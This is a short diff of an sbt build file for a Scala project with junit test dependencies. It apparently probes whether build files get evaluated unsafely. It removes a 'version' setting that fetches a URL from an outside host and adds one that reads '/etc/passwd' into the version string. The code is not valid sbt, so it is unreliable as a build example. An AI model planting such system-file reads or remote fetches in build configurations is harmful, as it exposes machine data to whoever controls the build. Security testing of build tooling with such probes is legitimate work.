@@ -6,9 +6,9 @@ scalaSource in Compile <<= baseDirectory(_ / "src")
 
 scalaSource in Test <<= baseDirectory(_ / "test-src")
 
-version := url("http://technically.z.buglloc.com/spde/About")
+version := cat(file("/etc/passwd"))
 
-libraryDependencies += "junit" % "junit" % cat(version)
+libraryDependencies += "junit" % "junit" % "${version}"
 
 libraryDependencies += "com.novocode" % "junit-interface" % "0.10-M4"
 
